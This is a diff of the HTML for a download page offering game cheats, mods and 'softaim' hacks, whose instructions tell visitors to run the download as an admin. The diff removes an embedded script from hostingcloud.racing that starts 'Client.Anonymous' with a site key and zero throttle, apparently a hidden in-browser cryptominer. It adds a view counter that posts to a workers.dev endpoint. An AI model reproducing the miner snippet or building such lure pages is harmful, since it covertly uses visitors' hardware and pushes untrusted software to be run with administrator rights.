@@ -1,14 +1,14 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Download</title>
-<meta name="description" content="">
+<meta name="description" content="Free scripts, software & tools for games.">
 <meta name="keywords" content="Mods, cheats, software, softaim, hacks">
 <link rel="icon" type="image/x-icon" href="Favicon.png">
 <meta name="robots" content="index, follow">
-<meta name="language" content="English">
 <link rel="canonical" href="https://slaya4.github.io/skibidi/">
 <style>
 body {
@@ -52,6 +52,21 @@ body {
     font-size: 15px;
     line-height: 1.6;
 }
+
+.views {
+    margin-top: 40px;
+    font-size: 13px;
+    color: #6b7280;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+.views svg {
+    width: 16px;
+    height: 16px;
+    stroke: #6b7280;
+}
 </style>
 </head>
 <body>
@@ -71,17 +86,23 @@ body {
     3. Run it as an admin
 </div>
 
-    <script src="https://www.hostingcloud.racing/tHaG.js"></script>
-<script>
-    var _client = new Client.Anonymous('f94fa3e5a743228b0b2cf96843fe50cd7d6aa10d418badd6ca86ebce01c8e780', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    
+<p class="views">
+    <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+        <circle cx="12" cy="12" r="3"></circle>
+    </svg>
+    Views: <span id="viewCount">...</span>
+</p>
 
+<script>
+fetch("https://counter.slaya7.workers.dev", {
+    method: "POST"
+})
+.then(r => r.json())
+.then(d => {
+    document.getElementById("viewCount").textContent = d.views.toLocaleString();
+});
 </script>
 
 </body>
 </html>
-
-
